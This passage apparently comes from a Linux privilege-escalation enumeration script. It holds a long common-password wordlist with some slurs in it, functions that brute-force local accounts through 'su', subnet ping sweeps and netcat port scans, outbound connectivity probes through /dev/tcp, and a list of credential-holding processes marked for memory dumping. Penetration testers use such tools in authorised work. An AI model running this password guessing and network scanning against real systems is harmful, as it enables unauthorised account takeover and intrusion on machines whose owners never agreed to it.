thunder success hannah ashley 131313 stella brandon pokemon joseph asdfasdf 999999 metallica december chester taylor sophie samuel rabbit crystal barney xxxxxx steven ranger patricia christian asshole spiderman sandra hockey angels security parker heather 888888 victor harley 333333 system slipknot november jordan23 canada tennis qwertyui casper gemini asd123 winter hammer cooper america albert 777777 winner charles butterfly swordfish popcorn penguin dolphin carolina access 987654 hardcore corvette apples 12341234 sabrina remember qwer1234 edward dennis cherry sparky natasha arthur vanessa marina leonardo johnny dallas antonio winston
snickers olivia nothing iceman destiny coffee apollo 696969 windows williams school madison dakota angelina anderson 159753 1111 yamaha trinity rebecca nathan guitar compaq 123123123 toyota shannon playboy peanut pakistan diablo abcdef maxwell golden asdasd 123654 murphy monica marlboro kimberly gateway bailey 00000000 snowball scooby nikita falcon august test123 sebastian panther love johnson godzilla genesis brandy adidas zxcvbn wizard porsche online hello123 fuckoff eagles champion bubbles boston smokey precious mercury lauren einstein cricket cameron angel admin napoleon mountain lovely friend flowers dolphins david chicago sierra knight yankees wilson warrior simple nelson muffin charlotte calvin spencer newyork florida fernando claudia basketball barcelona 87654321 willow stupid samson police paradise motorola manager jaguar jackie family doctor bullshit brooklyn tigers stephanie slayer peaches miller heaven elizabeth bulldog animal 789456 scorpio rosebud qwerty12 franklin claire american vincent testing pumpkin platinum louise kitten general united turtle marine icecream hacker darkness cristina colorado boomer alexandra steelers serenity please montana mitchell marcus lollipop jessie happy cowboy 102030 marshall jupiter jeremy gibson fucker barbara adrian 1qazxsw2 12344321 11111 startrek fishing digital christine business abcdefg nintendo genius 12qwaszx walker q1w2e3 player legend carmen booboo tomcat ronaldo people pamela marvin jackass google fender asdfghjk Password 1q2w3e4r5t zaq12wsx scotland phantom hercules fluffy explorer alexis walter trouble tester qwerty1 melanie manchester gordon firebird engineer azerty 147258 virginia tiger simpsons passion lakers james angelica 55555 vampire tiffany september private maximus loveme isabelle isabella eclipse dreamer changeme cassie badboy 123456a stanley sniper rocket passport pandora justice infinity cookies barbie xavier unicorn superstar
stephen rangers orlando money domino courtney viking tucker travis scarface pavilion nicolas natalie gandalf freddy donald captain abcdefgh a1b2c3d4 speedy peter nissan loveyou harrison friday francis dancer 159357 101010 spitfire saturn nemesis little dreams catherine brother birthday 1111111 wolverine victory student france fantasy enigma copper bonnie teresa mexico guinness georgia california sweety logitech julian hotdog emmanuel butter beatles 11223344 tristan sydney spirit october mozart lolita ireland goldfish eminem douglas cowboys control cheyenne alex testtest stargate raiders microsoft diesel debbie danger chance asdf anything aaaaaaaa welcome1 qwert hahaha forest eternity disney denise carter alaska zzzzzz titanic shorty shelby pookie pantera england chris zachary westside tamara password123 pass maryjane lincoln willie teacher pierre michael1 leslie lawrence kristina kawasaki drowssap college blahblah babygirl avatar alicia regina qqqqqq poohbear miranda madonna florence sapphire norman hamilton greenday galaxy frankie black awesome suzuki spring qazwsxedc magnum lovers liberty gregory 232323 twilight timothy swimming super stardust sophia sharon robbie predator penelope michigan margaret jesus hawaii green brittany brenda badger a1b2c3 444444 winnie wesley voodoo skippy shithead redskins qwertyu pussycat houston horses gunner fireball donkey cherokee australia arizona 1234abcd skyline power perfect lovelove kermit kenneth katrina eugene christ thailand support special runner lasvegas jason fuckme butthead blizzard athena abigail 8675309 violet tweety spanky shamrock red123 rascal melody joanna hello1 driver bluebird biteme atlantis arnold apple alison taurus random pirate monitor maria lizard kevin hummer holland buffalo 147258369 007007 valentine roberto potter magnolia juventus indigo indian harvey duncan diamonds daniela christopher bradley bananas warcraft sunset simone renegade
redsox philip monday mohammed indiana energy bond007 avalon terminator skipper shopping scotty savannah raymond morris mnbvcxz michele lucky lucifer kingdom karina giovanni cynthia a123456 147852 12121212 wildcats ronald portugal mike helpme froggy dragons cancer bullet beautiful alabama 212121 unknown sunflower sports siemens santiago kathleen hotmail hamster golfer future father enterprise clifford christina camille camaro beauty 55555555 vision tornado something rosemary qweasd patches magic helena denver cracker beaver basket atlanta vacation smiles ricardo pascal newton jeffrey jasmin january honey hollywood holiday gloria element chandler booger angelo allison action 99999999 target snowman miguel marley lorraine howard harmony children celtic beatrice airborne wicked voyager valentin thx1138 thumper samurai moonlight mmmmmm karate kamikaze jamaica emerald bubble brooke zombie strawberry spooky software simpson service sarah racing qazxsw philips oscar minnie lalala ironman goddess extreme empire elaine drummer classic carrie berlin asdfg 22222222 valerie tintin therock sunday skywalker salvador pegasus panthers packers network mission mark legolas lacrosse kitty kelly jester italia hiphop freeman charlie1 cardinal bluemoon bbbbbb bastard alyssa 0123456789 zeppelin tinker surfer smile rockstar operator naruto freddie dragonfly dickhead connor anaconda amsterdam alfred a12345 789456123 77777777 trooper skittles shalom raptor pioneer personal ncc1701 nascar music kristen kingkong global geronimo germany country christmas bernard benson wrestling warren techno sunrise stefan sister savage russell robinson oracle millie maddog lightning kingston kennedy hannibal garcia download dollar darkstar brutus bobby autumn webster vanilla undertaker tinkerbell sweetpea ssssss softball rafael panasonic pa55word keyboard isabel hector fisher dominic darkside cleopatra blue assassin amelia vladimir roland
nigger national monique molly matthew1 godfather frank curtis change central cartman brothers boogie archie warriors universe turkey topgun solomon sherry sakura rush2112 qwaszx office mushroom monika marion lorenzo john herman connect chopper burton blondie bitch bigdaddy amber 456789 1a2b3c4d ultimate tequila tanner sweetie scott rocky popeye peterpan packard loverboy leonard jimmy harry griffin design buddha 1 wallace truelove trombone toronto tarzan shirley sammy pebbles natalia marcel malcolm madeline jerome gilbert gangster dingdong catalina buddy blazer billy bianca alejandro 54321 252525 111222 0000 water sucker rooster potato norton lucky1 loving lol123 ladybug kittycat fuck forget flipper fireman digger bonjour baxter audrey aquarius 1111111111 pppppp planet pencil patriots oxford million martha lindsay laura jamesbond ihateyou goober giants garden diana cecilia brazil blessing bishop bigdog airplane Password1 tomtom stingray psycho pickle outlaw number1 mylove maurice madman maddie lester hendrix hellfire happy1 guardian flamingo enter chichi 0987654321 western twister trumpet trixie socrates singer sergio sandman richmond piglet pass123 osiris monkey1 martina justine english electric church castle caesar birdie aurora artist amadeus alberto 246810 whitney thankyou sterling star ronnie pussy printer picasso munchkin morpheus madmax kaiser julius imperial happiness goodluck counter columbia campbell blessed blackjack alpha 999999999 142536 wombat wildcat trevor telephone smiley saints pretty oblivion newcastle mariana janice israel imagine freedom1 detroit deedee darren catfish adriana washington warlock valentina valencia thebest spectrum skater sheila shaggy poiuyt member jessica1 jeremiah jack insane iloveu handsome goldberg gabriela elijah damien daisy buttons blabla bigboy apache anthony1 a1234567 xxxxxxxx toshiba tommy sailor peekaboo motherfucker montreal manuel madrid kramer
katherine kangaroo jenny immortal harris hamlet gracie fucking firefly chocolat bentley account 321321 2222 1a2b3c thompson theman strike stacey science running research polaris oklahoma mariposa marie leader julia island idontknow hitman german felipe fatcat fatboy defender applepie annette 010203 watson travel sublime stewart steve squirrel simon sexy pineapple phoebe paris panzer nadine master1 mario kelsey joker hongkong gorilla dinosaur connie bowling bambam babydoll aragorn andreas 456123 151515 wolves wolfgang turner semperfi reaper patience marilyn fletcher drpepper dorothy creation brian bluesky andre yankee wordpass sweet spunky sidney serena preston pauline passwort original nightmare miriam martinez labrador kristin kissme henry gerald garrett flash excalibur discovery dddddd danny collins casino broncos brendan brasil apple123 yvonne wonder window tomato sundance sasha reggie redwings poison mypassword monopoly mariah margarita lionking king football1 director darling bubba biscuit 44444444 wisdom vivian virgin sylvester street stones sprite spike single sherlock sandy rocker robin matt marianne linda lancelot jeanette hobbes fred ferret dodger cotton corona clayton celine cannabis bella andromeda 7654321 4444 werewolf starcraft sampson redrum pyramid prodigy paul michel martini marathon longhorn leopard judith joanne jesus1 inferno holly harold happy123 esther dudley dragon1 darwin clinton celeste catdog brucelee argentina alpine 147852369 wrangler william1 vikings trigger stranger silvia shotgun scarlett scarlet redhead raider qweasdzxc playstation mystery morrison honda february fantasia designer coyote cool bulldogs bernie baby asdfghj angel1 always adam 202020 wanker sullivan stealth skeeter saturday rodney prelude pingpong phillip peewee peanuts peace nugget newport myself mouse memphis lover lancer kristine james1 hobbit halloween fuckyou1 finger fearless dodgers delete cougar
charmed cassandra caitlin bismillah believe alice airforce 7777 viper tony theodore sylvia suzanne starfish sparkle server samsam qweqwe public pass1234 neptune marian krishna kkkkkk jungle cinnamon bitches 741852 trojan theresa sweetheart speaker salmon powers pizza overlord michaela meredith masters lindsey history farmer express escape cuddles carson candy buttercup brownie broken abc12345 aardvark Passw0rd 141414 124578 123789 12345678910 00000 universal trinidad tobias thursday surfing stuart stinky standard roller porter pearljam mobile mirage markus loulou jjjjjj herbert grace goldie frosty fighter fatima evelyn eagle desire crimson coconut cheryl beavis anonymous andres africa 134679 whiskey velvet stormy springer soldier ragnarok portland oranges nobody nathalie malibu looking lemonade lavender hitler hearts gotohell gladiator gggggg freckles fashion david1 crusader cosmos commando clover clarence center cadillac brooks bronco bonita babylon archer alexandre 123654789 verbatim umbrella thanks sunny stalker splinter sparrow selena russia roberts register qwert123 penguins panda ncc1701d miracle melvin lonely lexmark kitkat julie graham frances estrella downtown doodle deborah cooler colombia chemistry cactus bridge bollocks beetle anastasia 741852963 69696969 unique sweets station showtime sheena santos rock revolution reading qwerasdf password2 mongoose marlene maiden machine juliet illusion hayden fabian derrick crazy cooldude chipper bomber blonde bigred amazing aliens abracadabra 123qweasd wwwwww treasure timber smith shelly sesame pirates pinkfloyd passwords nature marlin marines linkinpark larissa laptop hotrod gambit elvis education dustin devils damian christy braves baller anarchy white valeria underground strong poopoo monalisa memory lizzie keeper justdoit house homer gerard ericsson emily divine colleen chelsea1 cccccc camera bonbon billie bigfoot badass asterix anna animals
andy achilles a1s2d3f4 violin veronika vegeta tyler test1234 teddybear tatiana sporting spartan shelley sharks respect raven pentium papillon nevermind marketing manson madness juliette jericho gabrielle fuckyou2 forgot firewall faith evolution eric eduardo dagger cristian cavalier canadian bruno blowjob blackie beagle admin123 010101 together spongebob snakes sherman reddog reality ramona puppies pedro pacific pa55w0rd omega noodle murray mollie mister halflife franco foster formula1 felix dragonball desiree default chris1 bunny bobcat asdf123 951753 5555 242424 thirteen tattoo stonecold stinger shiloh seattle santana roger roberta rastaman pickles orion mustang1 felicia dracula doggie cucumber cassidy britney brianna blaster belinda apple1 753951 teddy striker stevie soleil snake skateboard sheridan sexsex roxanne redman qqqqqqqq punisher panama paladin none lovelife lights jerry iverson inside hornet holden groovy gretchen grandma gangsta faster eddie chevelle chester1 carrot cannon button administrator a 1212 zxc123 wireless volleyball vietnam twinkle terror sandiego rose pokemon1 picture parrot movies moose mirror milton mayday maestro lollypop katana johanna hunting hudson grizzly gorgeous garbage fish ernest dolores conrad chickens charity casey blueberry blackman blackbird bill beckham battle atlantic wildfire weasel waterloo trance storm singapore shooter rocknroll richie poop pitbull mississippi kisses karen juliana james123 iguana homework highland fire elliot eldorado ducati discover computer1 buddy1 antonia alphabet 159951 123456789a 1123581321 0123456 zaq1xsw2 webmaster vagina unreal university tropical swimmer sugar southpark silence sammie ravens question presario poiuytrewq palmer notebook newman nebraska manutd lucas hermes gators dave dalton cheetah cedric camilla bullseye bridget bingo ashton 123asd yahoo volume valhalla tomorrow starlight scruffy roscoe richard1 positive
plymouth pepsi patrick1 paradox milano maxima loser lestat gizmo ghetto faithful emerson elliott dominique doberman dillon criminal crackers converse chrissy casanova blowme attitude"
PASSTRY="2000" 

if [ "$PORTS" ] || [ "$DISCOVERY" ] || [ "$IP" ]; then MAXPATH_FIND_W="1"; fi #If Network reduce the time on this
SEDOVERFLOW=true
for grp in `groups $USER | cut -d ":" -f2`; do 
  wgroups="$wgroups -group $grp -or "
done
wgroups="`echo $wgroups | sed -e 's/ -or$//'`"
while $SEDOVERFLOW; do
  #WF=`find /dev /srv /proc /home /media /sys /lost+found /run /etc /root /var /tmp /mnt /boot /opt -type d -maxdepth $MAXPATH_FIND_W -writable -or -user $USER 2>/dev/null | sort`
  #if [ "$MACPEAS" ]; then
    WF=`find / -maxdepth $MAXPATH_FIND_W -type d ! -path "/proc/*" '(' '(' -user $USER ')' -or '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')'  2>/dev/null | sort` #OpenBSD find command doesn't have "-writable" option
  #else
  #  WF=`find / -maxdepth $MAXPATH_FIND_W -type d ! -path "/proc/*" -and '(' -writable -or -user $USER ')' 2>/dev/null | sort`
  #fi
  Wfolders=`printf "$WF" | tr '\n' '|'`"|[^\*][^\ ]*\ \*"
  Wfolder="`printf "$WF" | grep "tmp\|shm\|home\|Users\|root\|etc\|var\|opt\|bin\|lib\|mnt\|private\|Applications" | head -n1`"
  printf "test\ntest\ntest\ntest"| sed -${E} "s,$Wfolders|\./|\.:|:\.,${C}[1;31;103m&${C}[0m,g" >/dev/null 2>&1
  if [ $? -eq 0 ]; then
      SEDOVERFLOW=false
  else
      MAXPATH_FIND_W=$(($MAXPATH_FIND_W-1)) #If overflow of directories, check again with MAXPATH_FIND_W - 1
  fi
  if [ $MAXPATH_FIND_W -lt 1 ] ; then # prevent infinite loop
     SEDOVERFLOW=false
  fi
done

notExtensions="\.tif$|\.tiff$|\.gif$|\.jpeg$|\.jpg|\.jif$|\.jfif$|\.jp2$|\.jpx$|\.j2k$|\.j2c$|\.fpx$|\.pcd$|\.png$|\.pdf$|\.flv$|\.mp4$|\.mp3$|\.gifv$|\.avi$|\.mov$|\.mpeg$|\.wav$|\.doc$|\.docx$|\.xls$|\.xlsx$|\.svg$"

TIMEOUT="`command -v timeout 2>/dev/null`"
STRACE="`command -v strace 2>/dev/null`"
STRINGS="`command -v strings 2>/dev/null`"

shscripsG="/0trace.sh|/alsa-info.sh|amuFormat.sh|/blueranger.sh|/crosh.sh|/dnsmap-bulk.sh|/get_bluetooth_device_class.sh|/gettext.sh|/go-rhn.sh|/gvmap.sh|/kernel_log_collector.sh|/lesspipe.sh|/lprsetup.sh|/mksmbpasswd.sh|/power_report.sh|/setuporamysql.sh|/setup-nsssysinit.sh|/readlink_f.sh|/rescan-scsi-bus.sh|/start_bluetoothd.sh|/start_bluetoothlog.sh|/testacg.sh|/testlahf.sh|/unix-lpr.sh|/url_handler.sh|/write_gpt.sh"

notBackup="/tdbbackup$|/db_hotbackup$"

cronjobsG=".placeholder|0anacron|0hourly|anacron|apache2|apport|apt|aptitude|apt-compat|bsdmainutils|certwatch|cracklib-runtime|debtags|dpkg|e2scrub_all|fake-hwclock|fstrim|john|locate|logrotate|man-db.cron|man-db|mdadm|mlocate|ntp|passwd|php|popularity-contest|raid-check|rwhod|samba|standard|sysstat|ubuntu-advantage-tools|update-notifier-common|upstart"
cronjobsB="centreon"

processesVB="jdwp|tmux |screen |--inspect|--remote-debugging-port"
processesB="knockd\|splunk"
processesDump="gdm-password|gnome-keyring-daemon|lightdm|vsftpd|apache2|sshd:"

mail_apps="Postfix|Dovecot|Exim|SquirrelMail|Cyrus|Sendmail|Courier"

profiledG="01-locale-fix.sh|256term.csh|256term.sh|abrt-console-notification.sh|appmenu-qt5.sh|apps-bin-path.sh|bash_completion.sh|cedilla-portuguese.sh|colorgrep.csh|colorgrep.sh|colorls.csh|colorls.sh|colorxzgrep.csh|colorxzgrep.sh|colorzgrep.csh|colorzgrep.sh|csh.local|cursor.sh|gawk.csh|gawk.sh|kali.sh|lang.csh|lang.sh|less.csh|less.sh|flatpak.sh|sh.local|vim.csh|vim.sh|vte.csh|vte-2.91.sh|which2.csh|which2.sh|xauthority.sh|Z97-byobu.sh|xdg_dirs_desktop_session.sh|Z99-cloudinit-warnings.sh|Z99-cloud-locale-test.sh"

knw_emails=".*@aivazian.fsnet.co.uk|.*@angband.pl|.*@canonical.com|.*centos.org|.*debian.net|.*debian.org|.*@jff.email|.*kali.org|.*linux.it|.*@linuxia.de|.*@lists.debian-maintainers.org|.*@mit.edu|.*@oss.sgi.com|.*@qualcomm.com|.*redhat.com|.*ubuntu.com|.*@vger.kernel.org|rogershimizu@gmail.com|thmarques@gmail.com"

timersG="anacron.timer|apt-daily.timer|apt-daily-upgrade.timer|e2scrub_all.timer|fstrim.timer|fwupd-refresh.timer|io.netplan.Netplan|logrotate.timer|man-db.timer|motd-news.timer|phpsessionclean.timer|snapd.refresh.timer|snapd.snap-repair.timer|systemd-tmpfiles-clean.timer|systemd-readahead-done.timer|ureadahead-stop.timer"

commonrootdirsG="^/$|/bin$|/boot$|/.cache$|/cdrom|/dev$|/etc$|/home$|/lost+found$|/lib$|/lib64$|/media$|/mnt$|/opt$|/proc$|/root$|/run$|/sbin$|/snap$|/srv$|/sys$|/tmp$|/usr$|/var$"
commonrootdirsMacG="^/$|/.DocumentRevisions-V100|/.fseventsd|/.PKInstallSandboxManager-SystemSoftware|/.Spotlight-V100|/.Trashes|/.vol|/Applications|/bin|/cores|/dev|/home|/Library|/macOS Install Data|/net|/Network|/opt|/private|/sbin|/System|/Users|/usr|/Volumes"

ldsoconfdG="/lib32|/lib/x86_64-linux-gnu|/usr/lib32|/usr/lib/oracle/19.6/client64/lib/|/usr/lib/x86_64-linux-gnu/libfakeroot|/usr/lib/x86_64-linux-gnu|/usr/local/lib/x86_64-linux-gnu|/usr/local/lib"

dbuslistG="^:1\.[0-9\.]+|com.hp.hplip|com.redhat.ifcfgrh1|com.redhat.NewPrinterNotification|com.redhat.PrinterDriversInstaller|com.redhat.RHSM1|com.redhat.RHSM1.Facts|com.redhat.tuned|com.ubuntu.LanguageSelector|com.ubuntu.SoftwareProperties|com.ubuntu.SystemService|com.ubuntu.USBCreator|com.ubuntu.WhoopsiePreferences|io.netplan.Netplan|io.snapcraft.SnapdLoginService|fi.epitest.hostap.WPASupplicant|fi.w1.wpa_supplicant1|NAME|org.blueman.Mechanism|org.bluez|org.debian.apt|org.fedoraproject.FirewallD1|org.fedoraproject.Setroubleshootd|org.fedoraproject.SetroubleshootFixit|org.fedoraproject.SetroubleshootPrivileged|org.freedesktop.Accounts|org.freedesktop.Avahi|org.freedesktop.bolt|org.freedesktop.ColorManager|org.freedesktop.DBus|org.freedesktop.DisplayManager|org.freedesktop.fwupd|org.freedesktop.GeoClue2|org.freedesktop.hostname1|org.freedesktop.import1|org.freedesktop.locale1|org.freedesktop.login1|org.freedesktop.machine1|org.freedesktop.ModemManager1|org.freedesktop.NetworkManager|org.freedesktop.network1|org.freedesktop.nm_dispatcher|org.freedesktop.PackageKit|org.freedesktop.PolicyKit1|org.freedesktop.portable1|org.freedesktop.realmd|org.freedesktop.RealtimeKit1|org.freedesktop.resolve1|org.freedesktop.systemd1|org.freedesktop.thermald|org.freedesktop.timedate1|org.freedesktop.timesync1|org.freedesktop.UDisks2|org.freedesktop.UPower|org.opensuse.CupsPkHelper.Mechanism"

##########################################
#---------) Checks before start (---------#
###########################################
# --) ps working good
# --) Network binaries

if [ `ps auxwww 2>/dev/null | wc -l 2>/dev/null` -lt 8 ]; then
  NOUSEPS="1"
fi

DISCOVER_BAN_BAD="No network discovery capabilities (fping or ping not found)"
FPING=$(command -v fping 2>/dev/null)
PING=$(command -v ping 2>/dev/null)
if [ "$FPING" ]; then
  DISCOVER_BAN_GOOD="$GREEN$FPING$B is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
else
  if [ "$PING" ]; then
    DISCOVER_BAN_GOOD="$GREEN$PING$B is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
  fi
fi

SCAN_BAN_BAD="No port scan capabilities (nc not found)"
FOUND_NC=$(command -v nc 2>/dev/null)
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v netcat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v ncat 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v nc.traditional 2>/dev/null);
fi
if [ -z "$FOUND_NC" ]; then
	FOUND_NC=$(command -v nc.openbsd 2>/dev/null);
fi
if [ "$FOUND_NC" ]; then
  SCAN_BAN_GOOD="$GREEN$FOUND_NC$B is available for network discover & port scanning$LG ($SCRIPTNAME can discover hosts and scan ports, learn more with -h)"
fi


###########################################
#-----------) Main Functions (------------#
###########################################

echo_not_found (){
  printf $DG"$1 Not Found\n"$NC
}

echo_no (){
  printf $DG"No\n"$NC
}

print_ps (){
  (ls -d /proc/*/ 2>/dev/null | while read f; do 
    CMDLINE=`cat $f/cmdline 2>/dev/null | grep -av "seds,"`; #Delete my own sed processess
    if [ "$CMDLINE" ]; 
      then USER2=ls -ld $f | awk '{print $3}'; PID=`echo $f | cut -d "/" -f3`; 
      printf "  %-13s  %-8s  %s\n" "$USER2" "$PID" "$CMDLINE"; 
    fi; 
  done) 2>/dev/null | sort -r
}

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout 1 su $USER -c whoami 2>/dev/null` 
  if [ "$trysu" ]; then
    echo "  You can login as $USER using password: $PASSWORDTRY" | sed -${E} "s,.*,${C}[1;31;103m&${C}[0m,"
  fi
}

su_brute_user_num (){
  USER=$1
  TRIES=$2
  su_try_pwd $USER "" &    #Try without password
  su_try_pwd $USER $USER & #Try username as password
  su_try_pwd $USER `echo $USER | rev 2>/dev/null` & #Try reverse username as password
  if [ "$PASSWORD" ]; then
    su_try_pwd $USER $PASSWORD & #Try given password
  fi
  for i in `seq $TRIES`; do 
    su_try_pwd $USER `echo $top2000pwds | cut -d " " -f $i` & #Try TOP TRIES of passwords (by default 2000)
    sleep 0.007 # To not overload the system
  done
  wait
}

check_if_su_brute(){
  error=$(echo "" | timeout 1 su `whoami` -c whoami 2>&1);
  if [ ! "`echo $error | grep "must be run from a terminal"`" ]; then
    echo "1"
  fi 
}

eval_bckgrd(){
  CMD_PARAM="$1"
  eval "$1" &
  CONT_THREADS=$(($CONT_THREADS+1)); if [ "$(($CONT_THREADS%$THREADS))" -eq "0" ]; then wait; fi
}


###########################################
#---------) Internet functions (----------#
###########################################
check_tcp_80(){
  (timeout -s KILL 20 /bin/bash -c '( echo >/dev/tcp/1.1.1.1/80 && echo "Port 80 is accessible" || echo "Port 80 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 80 is not accessible"
}
check_tcp_443(){
  (timeout -s KILL 20 /bin/bash -c '(echo >/dev/tcp/1.1.1.1/443 && echo "Port 443 is accessible" || echo "Port 443 is not accessible") 2>/dev/null | grep "accessible"') 2>/dev/null || echo "Port 443 is not accessible"
}
check_icmp(){
  (timeout -s KILL 20 /bin/bash -c '(ping -c 1 1.1.1.1 | grep "1 received" && echo "Ping is available" || echo "Ping is not available") 2>/dev/null | grep "available"') 2>/dev/null || echo "Ping is not available"
}
#DNS function from: https://unix.stackexchange.com/questions/600194/create-dns-query-with-netcat-or-dev-udp
#I cannot use this function because timeout doesn't find it, so it's copy/pasted below
check_dns(){
  (timeout 20 /bin/bash -c '(( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS available" || echo "DNS not available") 2>/dev/null | grep "available"' ) 2>/dev/null || echo "DNS not available"
}

###########################################
#----------) Network functions (----------#
###########################################
# Adapted from https://github.com/carlospolop/bashReconScan/blob/master/brs.sh

basic_net_info(){
  printf $B"═══════════════════════════╣ "$GREEN"Basic Network Info"$B" ╠═════════════════════════════\n"$NC
  (ifconfig || ip a) 2>/dev/null
  echo ""
}

select_nc (){
  #Select the correct configuration of the netcat found
  NC_SCAN="$FOUND_NC -v -n -z -w 1"
  $($FOUND_NC 127.0.0.1 65321 > /dev/null 2>&1)
  if [ $? -eq 2 ]
  then
    NC_SCAN="timeout 1 $FOUND_NC -v -n" 
  fi
}

icmp_recon (){
  #Discover hosts inside a /24 subnetwork using ping (start pingging broadcast addresses)
	IP3=$(echo $1 | cut -d "." -f 1,2,3)
	
  (timeout 1 ping -b -c 1 "$IP3.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${C}[1;31m&${C}[0m,") &
  (timeout 1 ping -b -c 1 "255.255.255.255" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${C}[1;31m&${C}[0m,") &
	for j in $(seq 0 254)
	do
    (timeout 1 ping -b -c 1 "$IP3.$j" 2>/dev/null | grep "icmp_seq" | sed -${E} "s,[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+,${C}[1;31m&${C}[0m,") &
	done
  wait
}

tcp_recon (){
  #Discover hosts inside a /24 subnetwork using tcp connection to most used ports and selected ones
  IP3=$(echo $1 | cut -d "." -f 1,2,3)
	PORTS=$2
  printf $Y"[+]$B Ports going to be scanned: $PORTS" $NC | tr '\n' " "
  printf "$NC\n"

  for port in $PORTS; do
    for j in $(seq 1 254)
    do 
      ($NC_SCAN $IP3.$j $port 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${C}[1;31m&${C}[0m,g") &
    done
    wait
  done
}

tcp_port_scan (){
  #Scan open ports of a host. Default: nmap top 1000, but the user can select others
  basic_net_info

  printf $B"═══════════════════════════════════╣ "$GREEN"Network Port Scanning"$B" ╠═══════════════════════════════════\n"$NC
  IP=$1
	PORTS="$2"
  PORTS="`echo \"$PORTS\" | tr ',' ' '`"

  if [ -z "$PORTS" ]; then
    printf $Y"[+]$B Ports going to be scanned: DEFAULT (nmap top 1000)" $NC | tr '\n' " "
    printf "$NC\n"
    PORTS="1 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 